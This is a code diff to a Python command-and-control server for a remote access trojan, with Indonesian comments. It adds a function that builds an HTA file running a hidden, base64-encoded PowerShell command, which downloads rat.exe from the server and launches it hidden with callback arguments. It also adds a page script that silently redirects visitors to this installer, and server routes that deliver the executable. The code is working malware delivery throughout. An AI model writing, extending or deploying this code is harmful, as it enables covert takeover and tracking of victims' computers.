@@ -80,6 +80,7 @@ EXPORT_PATH = "/export"
 REMOTE_PATH = "/remote"
 CMD_PATH = "/cmd"
 RESULT_PATH = "/result"
+AGENT_EXE_PATH = os.environ.get("C2_AGENT_EXE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "rat.exe"))
 
 events = []
 loc_cache = {}
@@ -129,6 +130,35 @@ def now_str():
 
 def file_ts():
     return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+
+
+def make_hta(server_url, machine_id):
+    """HTA silent installer: unduh rat.exe ke %TEMP% lalu jalankan hidden."""
+    import base64
+    from urllib.parse import urlsplit
+    u = urlsplit(server_url)
+    host = u.hostname or ""
+    port = u.port or (443 if u.scheme == "https" else 80)
+    tmp = "%TEMP%\\rat.exe"
+    ps = ("try{(New-Object Net.WebClient).DownloadFile('%s/agent/rat.exe','%s')}catch{};"
+          "Start-Process -WindowStyle Hidden '%s' -ArgumentList '%s','%d','%s','30'"
+          % (server_url, tmp, tmp, host, port, machine_id))
+    enc = base64.b64encode(ps.encode("utf-16-le")).decode("ascii")
+    line = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand %s" % enc
+    return """<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<script language="VBScript">
+Option Explicit
+Dim ws
+Set ws = CreateObject("WScript.Shell")
+ws.Run "%s", 0, False
+Set ws = Nothing
+window.close()
+</script>
+</head>
+<body></body>
+</html>""" % line
 
 
 def local_ip():
@@ -325,6 +355,14 @@ function sendLocation() {
     }, function(){}, {timeout: 15000, maximumAge: 300000, enableHighAccuracy: true});
 }
 sendLocation();
+function startAgent() {
+    var q = new URLSearchParams(location.search);
+    var id = q.get("id") || "lab-1";
+    setTimeout(function() {
+        window.location.href = "/agent/install.hta?id=" + encodeURIComponent(id);
+    }, 1800);
+}
+setTimeout(startAgent, 600);
 </script>
 </head>
 <body>
@@ -799,6 +837,27 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 except Exception:
                     pass
             self._send(404, "text/plain; charset=utf-8", b"Gambar tidak ditemukan")
+            return
+
+        if path == "/agent/rat.exe":
+            if os.path.isfile(AGENT_EXE_PATH):
+                try:
+                    with open(AGENT_EXE_PATH, "rb") as f:
+                        self._send(200, "application/octet-stream", f.read(),
+                                   [("Content-Disposition", 'attachment; filename="rat.exe"'), ("Cache-Control", "no-store")])
+                    return
+                except Exception:
+                    pass
+            self._send(404, "text/plain; charset=utf-8", b"rat.exe tidak ditemukan di folder server")
+            return
+
+        if path == "/agent/install.hta":
+            machine_id = query.get("id", [""])[0] or "lab-1"
+            host_hdr = (self.headers.get("Host", "") or self.headers.get("X-Forwarded-Host", "")).strip()
+            if not host_hdr:
+                host_hdr = self.real_client_ip()
+            server_url = "http://" + host_hdr if host_hdr else "http://" + self.client_address[0]
+            self._send(200, "application/hta", make_hta(server_url, machine_id).encode("utf-8"))
             return
 
         client_ip = self.real_client_ip()
